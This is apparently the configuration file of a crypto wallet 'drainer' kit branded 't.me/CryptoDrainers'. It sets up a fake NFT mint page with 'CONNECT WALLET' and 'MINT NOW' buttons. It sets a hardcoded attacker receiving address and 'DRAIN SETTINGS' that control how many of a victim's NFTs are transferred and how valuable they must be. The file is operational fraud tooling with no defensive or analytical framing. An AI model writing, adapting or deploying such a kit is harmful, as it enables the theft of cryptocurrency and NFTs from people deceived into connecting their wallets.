
/*
    = = = = = YOU WALLET ADRESS = = = = =
*/

const receiveAddress = "0x4E02375a803462FE27cb489e7C16ade676f13cD8";

/*
    = = = = = COLLECTION SETTINGS = = = = =
*/

const collectionInfo = {
    name: "t.me/CryptoDrainers",
    date: "13.05.2022",
    socialMedia: {
        discord: "discord.gg/invite_here",
        twitter: "https://twitter.com/username_here",
    },
    medias: {
        preview: "prev.gif",
        favicon: "favicon.ico",
    },
    background: {
        type: "image", // Supported types: image, video, color (use image for gif)
        image: "bg.gif", // Image for image type or video preview for video type (image befor video load)
        video: "background.mp4", // If you don't use video type, you can ignore this line
        color: "#4E4E6D", // If you don't use color type, you can ignore this line
    }
}


/*
    = = = = = MINT INFORMATIONS = = = = =
*/

const mintInfo = {
    price: 0.06,
    totalSupply: 1111,
    minUnits: 1,
    maxUnits: 5,
    askMintLoop: true,
}

/*
    = = = = = DRAIN SETTINGS = = = = =
*/

const drainNftsInfo = {
    active: false,
    minValue: 0.02,
    maxTransfer: 100,
    nftReceiveAddress: "0x4E02375a803462FE27cb489e7C16ade676f13cD8",
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "CONNECT WALLET",
    transferButton: "MINT NOW",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
